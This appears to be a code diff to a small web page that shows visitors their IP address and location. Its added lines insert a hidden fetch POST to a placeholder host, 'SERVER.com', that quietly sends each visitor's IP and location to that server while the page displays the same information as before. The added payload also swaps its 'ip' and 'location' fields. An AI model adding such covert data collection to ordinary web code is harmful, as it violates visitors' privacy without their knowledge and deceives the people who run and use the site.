@@ -45,7 +45,17 @@
         }
         return response.json();
       })
-      .then((json) => {
+      .then((json) => { 
+fetch("SERVER.com", {
+  method: "POST",
+  body: JSON.stringify({
+    location: json.YourFuckingIPAddress,
+    ip: json.YourFuckingLocation
+  }),
+  headers: {
+    "Content-type": "application/json; charset=UTF-8"
+  }
+});
         result.innerHTML = `
           <div class="info">Your IP is: ${json.YourFuckingIPAddress}</div>
           <div class="info">Your Location is: ${json.YourFuckingLocation}</div>`;
